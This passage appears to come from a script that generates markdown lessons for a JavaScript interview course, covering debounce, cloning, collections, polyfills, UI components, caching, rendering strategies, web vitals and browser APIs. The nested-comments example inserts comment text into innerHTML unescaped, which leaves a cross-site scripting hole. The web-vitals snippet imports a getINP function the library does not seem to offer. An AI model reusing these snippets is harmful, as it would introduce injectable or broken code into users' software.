// updateNavbar runs at most once every 100ms
\`\`\`

## When to use which

| Scenario | Use |
|---|---|
| Search input — fire after user stops typing | Debounce |
| Window resize — update layout | Debounce |
| Scroll position — update sticky header | Throttle |
| Mouse move — drag or canvas drawing | Throttle |
| Button spam prevention | Debounce |

> ⚠️ **Warning:** Debounce can feel laggy for drag/scroll — users expect immediate visual feedback. Use throttle there.
`);

write('js-cloning', `---
title: "Deep vs Shallow Clone"
category: "javascript"
chapterId: "js-memory-performance"
slug: "js-cloning"
description: "structuredClone(), JSON fallback, and recursive deep copy."
---

# Deep vs Shallow Clone

## What is it?

- **Shallow clone** — copies top-level properties. Nested objects still share the same reference.
- **Deep clone** — fully copies the entire structure. No shared references.

## Shallow clone methods

\`\`\`js
const original = { a: 1, nested: { b: 2 } };

const spread = { ...original };
const assign = Object.assign({}, original);

spread.nested.b = 99;
console.log(original.nested.b); // 99 — nested is still shared!
\`\`\`

## Deep clone — structuredClone() (modern, recommended)

\`\`\`js
const original = { a: 1, nested: { b: 2 }, arr: [1, 2, 3] };
const clone = structuredClone(original);

clone.nested.b = 99;
console.log(original.nested.b); // 2 — fully independent
\`\`\`

Supports: objects, arrays, Date, Map, Set, RegExp, ArrayBuffer.  
Does NOT support: functions, DOM nodes, class instances with methods.

## JSON fallback (limited)

\`\`\`js
const clone = JSON.parse(JSON.stringify(original));
// ❌ Loses: undefined, functions, Date, Map, Set, circular refs
\`\`\`

## Manual recursive deep clone (for custom types)

\`\`\`js
function deepClone(value) {
  if (value === null || typeof value !== 'object') return value;
  if (Array.isArray(value)) return value.map(deepClone);
  return Object.fromEntries(
    Object.entries(value).map(([k, v]) => [k, deepClone(v)])
  );
}
\`\`\`

> ⚠️ **Warning:** \`structuredClone\` throws on functions and DOM nodes. Check what you're cloning — the JSON trick silently drops unsupported values.
`);

write('js-collections', `---
title: "Map, Set, WeakMap, WeakSet"
category: "javascript"
chapterId: "js-memory-performance"
slug: "js-collections"
description: "Advanced collections and weak reference garbage collection."
---

# Map, Set, WeakMap, WeakSet

## Map — key-value store (any type as key)

\`\`\`js
const map = new Map();
map.set('name', 'Alice');
map.set(42, 'answer');
map.set({ id: 1 }, 'user object key'); // object as key — impossible with plain obj

map.get('name');   // 'Alice'
map.has(42);       // true
map.size;          // 3
map.delete(42);

// Iteration (preserves insertion order)
for (const [key, value] of map) {
  console.log(key, value);
}
\`\`\`

## Set — unique values only

\`\`\`js
const set = new Set([1, 2, 3, 2, 1]);
console.log([...set]); // [1, 2, 3] — duplicates removed

set.add(4);
set.has(3); // true
set.delete(1);
set.size;   // 3

// Remove duplicates from array
const unique = [...new Set([1, 1, 2, 2, 3])]; // [1, 2, 3]
\`\`\`

## WeakMap and WeakSet

Hold **weak references** — the key/value can be garbage collected when no other reference exists. Not iterable, no \`size\` property.

\`\`\`js
let element = document.getElementById('btn');
const metadata = new WeakMap();
metadata.set(element, { clicks: 0 });

// When element is removed from DOM and dereferenced:
element = null;
// WeakMap entry is automatically garbage collected
\`\`\`

## When to use which

| | Key type | GC-friendly | Iterable |
|---|---|---|---|
| \`Map\` | Any | No | ✅ Yes |
| \`Set\` | — | No | ✅ Yes |
| \`WeakMap\` | Objects only | ✅ Yes | ❌ No |
| \`WeakSet\` | Objects only | ✅ Yes | ❌ No |

> ⚠️ **Warning:** Use \`WeakMap\` for caching DOM-related data. Once the DOM node is removed, the cache entry is automatically freed — no manual cleanup needed.
`);

write('js-iterators-generators', `---
title: "Iterators & Generators"
category: "javascript"
chapterId: "js-memory-performance"
slug: "js-iterators-generators"
description: "Symbol.iterator, custom iterables, and function* with yield."
---

# Iterators & Generators

## What is an Iterator?

An object with a \`next()\` method that returns \`{ value, done }\`. Arrays, Strings, Maps, Sets are all iterable — they implement \`Symbol.iterator\`.

\`\`\`js
const arr = [1, 2, 3];
const iter = arr[Symbol.iterator]();

iter.next(); // { value: 1, done: false }
iter.next(); // { value: 2, done: false }
iter.next(); // { value: 3, done: false }
iter.next(); // { value: undefined, done: true }
\`\`\`

## Custom iterable

\`\`\`js
const range = {
  from: 1, to: 5,
  [Symbol.iterator]() {
    let current = this.from;
    const last = this.to;
    return {
      next() {
        return current <= last
          ? { value: current++, done: false }
          : { value: undefined, done: true };
      }
    };
  }
};

for (const n of range) console.log(n); // 1 2 3 4 5
\`\`\`

## Generator functions

A \`function*\` that can pause at \`yield\` and resume later. Lazy evaluation — values produced on demand.

\`\`\`js
function* count(start, end) {
  for (let i = start; i <= end; i++) {
    yield i; // pauses here, returns i
  }
}

const gen = count(1, 3);
gen.next(); // { value: 1, done: false }
gen.next(); // { value: 2, done: false }
gen.next(); // { value: 3, done: false }
gen.next(); // { value: undefined, done: true }

// Spread works too
[...count(1, 5)]; // [1, 2, 3, 4, 5]
\`\`\`

## Infinite sequence (memory-efficient)

\`\`\`js
function* fibonacci() {
  let [a, b] = [0, 1];
  while (true) {
    yield a;
    [a, b] = [b, a + b];
  }
}

const fib = fibonacci();
fib.next().value; // 0
fib.next().value; // 1
fib.next().value; // 1
fib.next().value; // 2
// Never loads the whole sequence into memory
\`\`\`

> ⚠️ **Warning:** Generators maintain state between calls — they are not pure. Avoid sharing a generator instance across multiple consumers.
`);

write('js-proxy-reflect', `---
title: "Proxy & Reflect"
category: "javascript"
chapterId: "js-memory-performance"
slug: "js-proxy-reflect"
description: "Intercepting and redefining object behaviors with meta-programming."
---

# Proxy & Reflect

## What is it?

**Proxy** wraps an object and intercepts fundamental operations (get, set, delete, call). **Reflect** provides default implementations of those same operations — used inside proxy handlers to preserve normal behavior.

## Basic Proxy

\`\`\`js
const handler = {
  get(target, key) {
    console.log(\`Getting \${key}\`);
    return Reflect.get(target, key); // default get
  },
  set(target, key, value) {
    if (typeof value !== 'number') throw new TypeError('Only numbers allowed');
    return Reflect.set(target, key, value);
  }
};

const obj = new Proxy({}, handler);
obj.score = 42;   // sets fine
obj.score = 'hi'; // TypeError
console.log(obj.score); // logs 'Getting score', returns 42
\`\`\`

## Validation proxy

\`\`\`js
function createValidated(schema) {
  return new Proxy({}, {
    set(target, key, value) {
      if (schema[key] && typeof value !== schema[key]) {
        throw new TypeError(\`\${key} must be \${schema[key]}\`);
      }
      return Reflect.set(target, key, value);
    }
  });
}

const user = createValidated({ name: 'string', age: 'number' });
user.name = 'Alice'; // ok
user.age = 'old';    // TypeError: age must be number
\`\`\`

## Proxy traps

| Trap | Triggered by |
|---|---|
| \`get\` | \`obj.prop\`, \`obj[key]\` |
| \`set\` | \`obj.prop = val\` |
| \`has\` | \`'key' in obj\` |
| \`deleteProperty\` | \`delete obj.prop\` |
| \`apply\` | \`fn()\` — proxy on functions |
| \`construct\` | \`new Fn()\` |

> ⚠️ **Warning:** Proxies have a performance cost on every access. Don't wrap hot-path objects in a proxy without benchmarking first.
`);

// ─── Ch7: Polyfills ───────────────────────────────────────────────────────────

write('js-polyfills', `---
title: "Custom Polyfills"
category: "javascript"
chapterId: "js-polyfills-machine-coding"
slug: "js-polyfills"
description: "Promise.all, Array.flat, Function.bind, deep clone from scratch."
---

# Custom Polyfills

## What is it?

A polyfill re-implements a native method from scratch — used in interviews to prove you understand internals, not just the API surface.

## Promise.all

\`\`\`js
Promise.myAll = function(promises) {
  return new Promise((resolve, reject) => {
    const results = [];
    let settled = 0;
    if (promises.length === 0) return resolve([]);

    promises.forEach((p, i) => {
      Promise.resolve(p).then(val => {
        results[i] = val;
        if (++settled === promises.length) resolve(results);
      }).catch(reject);
    });
  });
};
\`\`\`

## Function.prototype.bind

\`\`\`js
Function.prototype.myBind = function(ctx, ...outerArgs) {
  const fn = this;
  return function(...innerArgs) {
    return fn.apply(ctx, [...outerArgs, ...innerArgs]);
  };
};
\`\`\`

## Array.prototype.flat

\`\`\`js
Array.prototype.myFlat = function(depth = 1) {
  return depth > 0
    ? this.reduce((acc, val) =>
        acc.concat(Array.isArray(val) ? val.myFlat(depth - 1) : val), [])
    : this.slice();
};
\`\`\`

## Array.prototype.reduce

\`\`\`js
Array.prototype.myReduce = function(fn, initialValue) {
  let acc = initialValue !== undefined ? initialValue : this[0];
  const start = initialValue !== undefined ? 0 : 1;
  for (let i = start; i < this.length; i++) {
    acc = fn(acc, this[i], i, this);
  }
  return acc;
};
\`\`\`

## Deep Clone

\`\`\`js
function deepClone(val, seen = new WeakMap()) {
  if (val === null || typeof val !== 'object') return val;
  if (seen.has(val)) return seen.get(val); // handle circular refs
  const clone = Array.isArray(val) ? [] : {};
  seen.set(val, clone);
  for (const key of Object.keys(val)) {
    clone[key] = deepClone(val[key], seen);
  }
  return clone;
}
\`\`\`

## EventEmitter class

\`\`\`js
class EventEmitter {
  constructor() { this._events = {}; }

  on(event, listener) {
    (this._events[event] ??= []).push(listener);
    return this;
  }

  off(event, listener) {
    this._events[event] = (this._events[event] || []).filter(l => l !== listener);
    return this;
  }

  emit(event, ...args) {
    (this._events[event] || []).forEach(l => l(...args));
    return this;
  }

  once(event, listener) {
    const wrapper = (...args) => { listener(...args); this.off(event, wrapper); };
    return this.on(event, wrapper);
  }
}
\`\`\`

> ⚠️ **Warning:** In interviews, always handle edge cases — empty arrays, undefined initial values, and circular references score extra points.
`);

write('js-ui-components', `---
title: "Complex UI Components"
category: "javascript"
chapterId: "js-polyfills-machine-coding"
slug: "js-ui-components"
description: "Autocomplete, infinite scroll, nested comments from scratch."
---

# Complex UI Components

## Autocomplete / Typeahead with debounce + cache

\`\`\`js
const cache = new Map();

async function fetchSuggestions(query) {
  if (cache.has(query)) return cache.get(query);
  const res = await fetch(\`/api/suggest?q=\${encodeURIComponent(query)}\`);
  const data = await res.json();
  cache.set(query, data);
  return data;
}

const search = debounce(async (query) => {
  if (query.length < 2) return clearDropdown();
  const suggestions = await fetchSuggestions(query);
  renderDropdown(suggestions);
}, 300);

input.addEventListener('input', e => search(e.target.value));
\`\`\`

## Infinite Scroll with IntersectionObserver

\`\`\`js
let page = 1;
let loading = false;

const sentinel = document.querySelector('#sentinel'); // empty div at bottom

const observer = new IntersectionObserver(async (entries) => {
  if (!entries[0].isIntersecting || loading) return;
  loading = true;

  const items = await fetchPage(page++);
  if (items.length === 0) return observer.disconnect(); // no more data

  appendItems(items);
  loading = false;
}, { threshold: 0.1 });

observer.observe(sentinel);
\`\`\`

## Nested Comments (Reddit-style)

\`\`\`js
function renderComment(comment) {
  const div = document.createElement('div');
  div.className = 'comment';
  div.innerHTML = \`<p>\${comment.text}</p>\`;

  if (comment.replies?.length) {
    const replies = document.createElement('div');
    replies.className = 'replies';
    comment.replies.forEach(reply => replies.appendChild(renderComment(reply)));
    div.appendChild(replies);
  }

  return div;
}

// Usage
const data = {
  text: 'Root comment',
  replies: [
    { text: 'Reply 1', replies: [{ text: 'Nested reply', replies: [] }] },
    { text: 'Reply 2', replies: [] }
  ]
};

document.body.appendChild(renderComment(data));
\`\`\`

> ⚠️ **Warning:** Always cancel inflight fetch requests when a new search query comes in — use \`AbortController\` to avoid race conditions in autocomplete.
`);

write('js-lru-cache', `---
title: "LRU Cache"
category: "javascript"
chapterId: "js-polyfills-machine-coding"
slug: "js-lru-cache"
description: "Implementing a Least Recently Used cache for browser caching."
---

# LRU Cache

## What is it?

An LRU (Least Recently Used) cache holds a fixed number of items. When full, it evicts the item that was accessed least recently. Classic interview question that tests Map + linked list thinking.

## Implementation using Map (O(1) get and put)

\`\`\`js
class LRUCache {
  #capacity;
  #map; // Map preserves insertion order

  constructor(capacity) {
    this.#capacity = capacity;
    this.#map = new Map();
  }

  get(key) {
    if (!this.#map.has(key)) return -1;
    const value = this.#map.get(key);
    // Move to end (most recently used)
    this.#map.delete(key);
    this.#map.set(key, value);
    return value;
  }

  put(key, value) {
    if (this.#map.has(key)) this.#map.delete(key);
    this.#map.set(key, value);
    if (this.#map.size > this.#capacity) {
      // Delete oldest entry (first key in Map)
      this.#map.delete(this.#map.keys().next().value);
    }
  }
}

const cache = new LRUCache(3);
cache.put('a', 1);
cache.put('b', 2);
cache.put('c', 3);
cache.get('a');    // 1 — moves 'a' to most recent
cache.put('d', 4); // evicts 'b' (least recently used)
cache.get('b');    // -1 — evicted
\`\`\`

## Using as an API response cache

\`\`\`js
const apiCache = new LRUCache(50);

async function fetchUser(id) {
  const cached = apiCache.get(id);
  if (cached !== -1) return cached;

  const user = await fetch(\`/api/users/\${id}\`).then(r => r.json());
  apiCache.put(id, user);
  return user;
}
\`\`\`

> ⚠️ **Warning:** JS \`Map\` iteration is guaranteed in insertion order — this is what makes the O(1) LRU implementation possible without a doubly-linked list.
`);

// ─── Ch8: System Design ───────────────────────────────────────────────────────

write('js-micro-frontends', `---
title: "Micro-Frontends"
category: "javascript"
chapterId: "js-system-design"
slug: "js-micro-frontends"
description: "Build-time vs run-time integration with Module Federation."
---

# Micro-Frontends

## What is it?

Micro-frontends split a large frontend app into **independently deployable pieces**, each owned by a separate team. Similar to microservices, but for the UI layer.

## Integration approaches

| Approach | How | When to use |
|---|---|---|
| **Build-time** | npm packages, Webpack Module Federation at build | Shared libraries, design systems |
| **Run-time (iframes)** | \`<iframe src="app2.example.com">\` | Strong isolation needed |
| **Run-time (JS bundles)** | Load remote scripts dynamically | Independent deployments |
| **Module Federation** | Webpack 5 shares live modules across apps | Full micro-frontend architecture |

## Webpack Module Federation (conceptual)

**Host app** (shell):
\`\`\`js
// webpack.config.js
new ModuleFederationPlugin({
  name: 'host',
  remotes: {
    cart: 'cart@http://localhost:3001/remoteEntry.js',
  },
});

// In the app
const CartWidget = React.lazy(() => import('cart/CartWidget'));
\`\`\`

**Remote app** (cart):
\`\`\`js
new ModuleFederationPlugin({
  name: 'cart',
  filename: 'remoteEntry.js',
  exposes: { './CartWidget': './src/CartWidget' },
  shared: ['react', 'react-dom'], // share to avoid duplicates
});
\`\`\`

## Trade-offs

| Pros | Cons |
|---|---|
| Independent deployments | Complex setup |
| Team autonomy | Shared state is hard |
| Tech diversity possible | Performance overhead |
| Isolated failures | CSS conflicts |

> ⚠️ **Warning:** Micro-frontends add significant operational overhead. Only adopt them when you have multiple large, independent teams — not for small projects.
`);

write('js-state-architecture', `---
title: "State Management Architecture"
category: "javascript"
chapterId: "js-system-design"
slug: "js-state-architecture"
description: "Normalized state, trade-offs between Redux, Zustand, and Signals."
---

# State Management Architecture

## What is it?

At scale, how you structure client-side state matters as much as how you fetch data. Two key problems: **normalization** (avoiding duplicate data) and **performance** (avoiding unnecessary re-renders).

## Normalized state shape

Flat, database-like structure indexed by ID — eliminates duplication and simplifies updates.

\`\`\`js
// ❌ Denormalized — user repeated in every post
{ posts: [{ id: 1, user: { id: 1, name: 'Alice' }, title: '...' }] }

// ✅ Normalized — user stored once, referenced by ID
{
  users: { 1: { id: 1, name: 'Alice' } },
  posts: { 1: { id: 1, userId: 1, title: '...' } },
  postIds: [1, 2, 3],
}
\`\`\`

## Tool comparison

| | Context API | Zustand | Redux Toolkit | Signals (Preact/Solid) |
|---|---|---|---|---|
| Bundle size | 0kb | ~1kb | ~10kb | ~2kb |
| Boilerplate | Low | Very low | Medium | Very low |
| DevTools | ❌ | ✅ | ✅ Best | Limited |
| Re-render control | Poor | Good | Good | Excellent |
| Server state | ❌ | ❌ | ❌ | ❌ (use TanStack Query) |
| Best for | Simple/infrequent | Most apps | Large teams | Fine-grained UI |

## Zustand normalized store example

\`\`\`js
import { create } from 'zustand';

const useStore = create((set) => ({
  users: {},
  posts: {},
  addPost: (post) => set(state => ({
    posts: { ...state.posts, [post.id]: post },
    users: { ...state.users, [post.user.id]: post.user },
  })),
}));
\`\`\`

> ⚠️ **Warning:** Don't put server state (API responses) in Redux/Zustand — use TanStack Query or SWR. Global stores are for client-side UI state (modals, selected items, preferences).
`);

write('js-monorepos', `---
title: "Monorepos"
category: "javascript"
chapterId: "js-system-design"
slug: "js-monorepos"
description: "Turborepo, Lerna, Nx for multi-package dependency graphs."
---

# Monorepos

## What is it?

A monorepo stores multiple related packages (apps, libraries, config) in a single Git repository. Instead of many repos, you have one — with shared tooling, atomic commits across packages, and easy cross-package refactoring.

## Structure

\`\`\`
my-monorepo/
├── apps/
│   ├── web/          ← Next.js app
│   └── mobile/       ← React Native app
├── packages/
│   ├── ui/           ← shared component library
│   ├── config/       ← shared ESLint, TypeScript config
│   └── utils/        ← shared utilities
├── package.json      ← workspace root
└── turbo.json        ← Turborepo config
\`\`\`

## Turborepo (recommended)

\`\`\`json
// turbo.json
{
  "pipeline": {
    "build": {
      "dependsOn": ["^build"],   // build dependencies first
      "outputs": [".next/**", "dist/**"]
    },
    "test": { "dependsOn": ["build"] },
    "lint": {}
  }
}
\`\`\`

\`\`\`bash
npx turbo run build  # builds all packages in correct order, caches results
npx turbo run test --filter=web  # run only for the web app
\`\`\`

## Tool comparison

| | Turborepo | Nx | Lerna |
|---|---|---|---|
| Speed | ✅ Fastest (Rust) | Fast | Slow |
| Caching | ✅ Local + remote | ✅ Local + remote | ❌ |
| Complexity | Low | High | Low |
| Best for | Build pipeline speed | Enterprise, generators | Legacy projects |

> ⚠️ **Warning:** Monorepos require discipline — poor dependency boundaries make the entire repo slower to build. Define clear package ownership and minimize circular dependencies.
`);

write('js-rendering-strategies', `---
title: "Rendering Strategies"
category: "javascript"
chapterId: "js-system-design"
slug: "js-rendering-strategies"
description: "CSR, SSR, SSG, and ISR trade-offs and when to use each."
---

# Rendering Strategies

## What is it?

Where and when HTML is generated — this decision impacts SEO, performance, and infrastructure complexity.

## The four strategies

### CSR — Client-Side Rendering (SPA)
Server sends an empty HTML shell. React/JS runs in the browser and builds the UI.
- ✅ Cheap hosting (static files)
- ✅ Rich interactivity
- ❌ Slow first load, poor SEO

### SSR — Server-Side Rendering
Server runs React on every request and sends full HTML.
- ✅ Always fresh data
- ✅ Good SEO
- ❌ Slower TTFB, higher server cost

### SSG — Static Site Generation
React runs at build time. HTML files pre-built and served from CDN.
- ✅ Fastest possible — CDN delivery
- ✅ Excellent SEO
- ❌ Stale data until rebuild

### ISR — Incremental Static Regeneration (Next.js)
Like SSG but pages can revalidate in the background after N seconds.
- ✅ Static speed + near-fresh data
- ❌ First visitor after expiry may see stale page

## Choosing a strategy

| Page type | Use |
|---|---|
| Dashboard / authenticated UI | CSR |
| Blog post, product page | SSG + ISR |
| User profile, personalized content | SSR |
| Marketing landing page | SSG |
| Real-time feed | CSR or SSR + streaming |

> ⚠️ **Warning:** These are not mutually exclusive — mix per route. Next.js App Router lets each page choose independently.
`);

// ─── Ch9: Web Vitals ─────────────────────────────────────────────────────────

write('js-core-web-vitals', `---
title: "Core Web Vitals"
category: "javascript"
chapterId: "js-web-vitals"
slug: "js-core-web-vitals"
description: "CLS, INP, and LCP — measuring and solving performance issues."
---

# Core Web Vitals

## What is it?

Google's set of real-world performance metrics that directly affect SEO ranking. Measured from real user data via Chrome UX Report (CrUX).

## The three metrics

### LCP — Largest Contentful Paint
Time until the largest visible content element is rendered.
- **Good**: < 2.5s | **Poor**: > 4s

**Common causes and fixes:**
\`\`\`html
<!-- ❌ Slow — image not prioritized -->
<img src="hero.jpg" />

<!-- ✅ Fast — preload and priority hint -->
<link rel="preload" href="hero.jpg" as="image" />
<img src="hero.jpg" fetchpriority="high" />
\`\`\`

### CLS — Cumulative Layout Shift
Sum of unexpected layout shifts — elements jumping around during load.
- **Good**: < 0.1 | **Poor**: > 0.25

**Common causes and fixes:**
\`\`\`html
<!-- ❌ Causes shift — no dimensions -->
<img src="banner.jpg" />

<!-- ✅ Reserve space with aspect-ratio or explicit dimensions -->
<img src="banner.jpg" width="800" height="400" />

<!-- ✅ CSS approach -->
<style>
.hero-img { aspect-ratio: 16/9; width: 100%; }
</style>
\`\`\`

### INP — Interaction to Next Paint
Worst-case delay from user interaction to visual response.
- **Good**: < 200ms | **Poor**: > 500ms

**Fixes:**
\`\`\`js
// Break up long tasks — yield to the browser
async function processLargeData(items) {
  for (let i = 0; i < items.length; i++) {
    process(items[i]);
    if (i % 50 === 0) await new Promise(r => setTimeout(r, 0)); // yield
  }
}

// Defer non-urgent updates with useTransition (React)
startTransition(() => setExpensiveState(newData));
\`\`\`

## Measuring

\`\`\`js
import { getLCP, getCLS, getINP } from 'web-vitals';

getLCP(console.log);
getCLS(console.log);
getINP(console.log);
\`\`\`

> ⚠️ **Warning:** Lab tools (Lighthouse) measure ideal conditions. Real user INP/CLS can differ greatly. Use field data from Search Console or CrUX for real decisions.
`);

write('js-resource-hints', `---
title: "Resource Prioritization"
category: "javascript"
chapterId: "js-web-vitals"
slug: "js-resource-hints"
description: "preload, prefetch, preconnect, and prerender asset hints."
---

# Resource Prioritization

## What is it?

HTML hints that tell the browser what to fetch and when — before it naturally discovers the resource. Used to eliminate render-blocking delays and speed up navigation.

## preload — fetch NOW, high priority

Use for critical resources needed in the current page (fonts, hero image, LCP element).

\`\`\`html
<!-- Preload the LCP hero image -->
<link rel="preload" href="/hero.webp" as="image" fetchpriority="high" />

<!-- Preload a font to prevent FOIT (flash of invisible text) -->
<link rel="preload" href="/fonts/Inter.woff2" as="font" type="font/woff2" crossorigin />

<!-- Preload a critical JS chunk -->
<link rel="preload" href="/chunk-critical.js" as="script" />
\`\`\`

## prefetch — fetch LATER, low priority

For resources needed on the NEXT page navigation.

\`\`\`html
<!-- User is likely to click "About" next -->
<link rel="prefetch" href="/about.js" as="script" />
\`\`\`

## preconnect — establish TCP/TLS connection early

For third-party origins your page will request (fonts, APIs, CDNs).

\`\`\`html
<link rel="preconnect" href="https://fonts.googleapis.com" />
<link rel="preconnect" href="https://api.example.com" crossorigin />
\`\`\`

## dns-prefetch — DNS lookup only (cheaper fallback)

\`\`\`html
<link rel="dns-prefetch" href="https://analytics.example.com" />
\`\`\`

## Summary

| Hint | When | Priority |
|---|---|---|
| \`preload\` | Critical resource, current page | High |
| \`prefetch\` | Likely next page resource | Low |
| \`preconnect\` | Third-party origin you'll use | Medium |
| \`dns-prefetch\` | Third-party origin, DNS only | Very low |

> ⚠️ **Warning:** Over-preloading competes for bandwidth and can slow the LCP element. Only preload 2-3 critical resources maximum.
`);

write('js-asset-optimization', `---
title: "Network & Asset Tuning"
category: "javascript"
chapterId: "js-web-vitals"
slug: "js-asset-optimization"
description: "WebP/AVIF, responsive images, code splitting, and bundle chunking."
---

# Network & Asset Tuning

## Modern image formats

\`\`\`html
<!-- AVIF → WebP → JPEG fallback -->
<picture>
  <source srcset="image.avif" type="image/avif" />
  <source srcset="image.webp" type="image/webp" />
  <img src="image.jpg" alt="..." width="800" height="400" />
</picture>
\`\`\`

| Format | Compression vs JPEG |
|---|---|
| JPEG | baseline |
| WebP | ~30% smaller |
| AVIF | ~50% smaller |

## Responsive images

\`\`\`html
<img
  src="photo-800.webp"
  srcset="photo-400.webp 400w, photo-800.webp 800w, photo-1200.webp 1200w"
  sizes="(max-width: 600px) 400px, (max-width: 900px) 800px, 1200px"
  alt="..."
  loading="lazy"
  decoding="async"
/>
\`\`\`

## Code splitting and chunking

\`\`\`js
// Route-level splitting — each route is a separate chunk
const About = lazy(() => import('./pages/About'));

// Vendor chunk — separate node_modules from app code
// vite.config.js
build: {
  rollupOptions: {
    output: {
      manualChunks: {
        vendor: ['react', 'react-dom'],
        charts: ['recharts'],
      }
    }
  }
}
\`\`\`

## Bundle analysis

\`\`\`bash
# Vite
npx vite-bundle-visualizer

# Next.js
npx @next/bundle-analyzer
\`\`\`

## Checklist

- ✅ Serve images in AVIF/WebP
- ✅ Use \`loading="lazy"\` for below-fold images
- ✅ Set explicit \`width\` and \`height\` on images (prevents CLS)
- ✅ Enable gzip/brotli compression on server
- ✅ Split routes with \`React.lazy\`
- ✅ Tree-shake unused imports (ES Modules + bundler)
- ✅ Use \`fetchpriority="high"\` on LCP image

> ⚠️ **Warning:** \`loading="lazy"\` on your LCP image delays it — only use lazy loading on below-the-fold images.
`);

// ─── Ch10: Browser APIs ───────────────────────────────────────────────────────

write('js-workers', `---
title: "Web Workers & Service Workers"
category: "javascript"
chapterId: "js-browser-apis"
slug: "js-workers"
description: "Off-main-thread execution and offline caching strategies."
---

# Web Workers & Service Workers

## Web Workers — off-main-thread computation

Run CPU-heavy code without blocking the UI thread. No DOM access.

\`\`\`js
// worker.js
self.onmessage = function(e) {
  const result = heavyComputation(e.data); // runs off main thread
  self.postMessage(result);
};

// main.js
const worker = new Worker('./worker.js');
worker.postMessage(largeDataset);
worker.onmessage = (e) => console.log('Result:', e.data);
worker.terminate(); // clean up when done
\`\`\`

**Use for:** image processing, large data parsing, cryptography, sorting huge arrays.

## Service Workers — offline and cache control

A proxy between your app and the network. Intercepts fetch requests.

\`\`\`js
// service-worker.js
const CACHE = 'v1';
const ASSETS = ['/', '/index.html', '/app.js', '/style.css'];

// Install — cache static assets
self.addEventListener('install', (e) => {
  e.waitUntil(caches.open(CACHE).then(c => c.addAll(ASSETS)));
});

// Fetch — serve from cache, fall back to network
self.addEventListener('fetch', (e) => {
  e.respondWith(
    caches.match(e.request).then(cached => cached || fetch(e.request))
  );
});

// main.js — register
if ('serviceWorker' in navigator) {
  navigator.serviceWorker.register('/service-worker.js');
}
\`\`\`

## Comparison

| | Web Worker | Service Worker |
|---|---|---|
| Purpose | Heavy computation | Network interception, caching |
| DOM access | ❌ | ❌ |
| Lifetime | Tab lifetime | Background, survives tab close |
| Scope | One page | Origin-wide |

> ⚠️ **Warning:** Cached service worker files can get stuck. Always update the cache name version string when deploying new assets, and handle the \`activate\` event to delete old caches.
`);

write('js-observers', `---
title: "Observability APIs"
category: "javascript"
chapterId: "js-browser-apis"
slug: "js-observers"
description: "IntersectionObserver, MutationObserver, and ResizeObserver."
---

# Observability APIs

## IntersectionObserver — element visibility

Fires a callback when an element enters or leaves the viewport. No scroll listener needed.

\`\`\`js
const observer = new IntersectionObserver((entries) => {
  entries.forEach(entry => {
    if (entry.isIntersecting) {
      entry.target.classList.add('visible');
      observer.unobserve(entry.target); // stop watching once visible
    }
  });
}, {
  threshold: 0.2,      // fires when 20% visible
  rootMargin: '0px 0px -50px 0px' // trigger 50px before bottom edge
});

document.querySelectorAll('.fade-in').forEach(el => observer.observe(el));
\`\`\`

**Use for:** lazy loading images, infinite scroll, scroll animations, analytics visibility tracking.

## MutationObserver — DOM changes

Fires when nodes are added/removed or attributes change.

\`\`\`js
const observer = new MutationObserver((mutations) => {
  mutations.forEach(m => {
    m.addedNodes.forEach(node => {
      if (node.nodeType === 1) console.log('Element added:', node);
    });
  });
});

observer.observe(document.body, {
  childList: true,  // watch for add/remove
  subtree: true,    // watch descendants too
  attributes: true, // watch attribute changes
});

// Stop observing
observer.disconnect();
\`\`\`

**Use for:** tracking third-party DOM injections, custom component polyfills, auto-reinitializing plugins.

## ResizeObserver — element size changes

Fires when an element's size changes — more reliable than window resize for component-level layout.

\`\`\`js
const observer = new ResizeObserver((entries) => {
  entries.forEach(entry => {
    const { width, height } = entry.contentRect;
    console.log(\`New size: \${width}x\${height}\`);
  });
});

observer.observe(document.getElementById('chart-container'));
\`\`\`

**Use for:** responsive charts, re-measuring text, container queries polyfills.

> ⚠️ **Warning:** Always call \`observer.disconnect()\` or \`observer.unobserve(el)\` when the component unmounts — otherwise the callback fires forever, leaking memory.
`);

write('js-raf', `---
title: "requestAnimationFrame"
category: "javascript"
chapterId: "js-browser-apis"
slug: "js-raf"
description: "Synchronizing animations with the browser's repaint cycle."
---

# requestAnimationFrame

## What is it?

\`requestAnimationFrame(callback)\` schedules your callback to run just before the browser's next repaint — synced to the display's refresh rate (typically 60fps = every 16ms). This produces smooth animations without tearing or wasted frames.

## When to use it?

Any visual animation or DOM manipulation that needs to look smooth — canvas drawing, progress bars, scroll-linked animations, game loops.

## How to use it

\`\`\`js
// Basic animation loop
let x = 0;

function animate(timestamp) {
  x += 2;
  element.style.transform = \`translateX(\${x}px)\`;

  if (x < 500) {
    requestAnimationFrame(animate); // schedule next frame
  }
}

requestAnimationFrame(animate); // kick off
\`\`\`

## Stopping an animation

\`\`\`js
let rafId;

function start() {
  function loop() {
    draw();
    rafId = requestAnimationFrame(loop);
  }
  rafId = requestAnimationFrame(loop);
}

function stop() {
  cancelAnimationFrame(rafId);
}
\`\`\`

## raf vs setTimeout

\`\`\`js
// ❌ setTimeout — fires regardless of repaint, can tear, wastes frames in bg tab
setInterval(() => { element.style.left = x++ + 'px'; }, 16);

// ✅ rAF — synced to display, pauses in background tabs, no wasted frames
function loop() {
  element.style.left = x++ + 'px';
  requestAnimationFrame(loop);
}
requestAnimationFrame(loop);
\`\`\`

> ⚠️ **Warning:** Never do heavy computation inside a \`requestAnimationFrame\` callback — you only have ~16ms. Move data processing to a Web Worker and use rAF only for rendering.
`);

write('js-browser-storage', `---
title: "Browser Storage"
category: "javascript"
chapterId: "js-browser-apis"
slug: "js-browser-storage"
description: "LocalStorage, SessionStorage, IndexedDB, and Cookies compared."
---

# Browser Storage

## The four options

### LocalStorage

\`\`\`js
localStorage.setItem('theme', 'dark');
localStorage.getItem('theme');       // 'dark'
localStorage.removeItem('theme');
localStorage.clear();
\`\`\`
- Persists until explicitly cleared
- ~5MB, strings only — JSON.stringify for objects
- Synchronous — blocks main thread for large data

### SessionStorage

Same API as LocalStorage, but cleared when the tab closes.

\`\`\`js
sessionStorage.setItem('draftPost', JSON.stringify(draft));
\`\`\`

### IndexedDB

Async, NoSQL database in the browser. Suitable for large structured data.

\`\`\`js
const db = await new Promise((resolve, reject) => {
  const req = indexedDB.open('my-app', 1);
  req.onupgradeneeded = (e) => e.target.result.createObjectStore('users', { keyPath: 'id' });
  req.onsuccess = (e) => resolve(e.target.result);
  req.onerror = reject;
});
\`\`\`

(Use the \`idb\` library for a promise-based wrapper.)

### Cookies

\`\`\`js
document.cookie = 'token=abc; Path=/; Max-Age=3600; Secure; SameSite=Strict';
\`\`\`
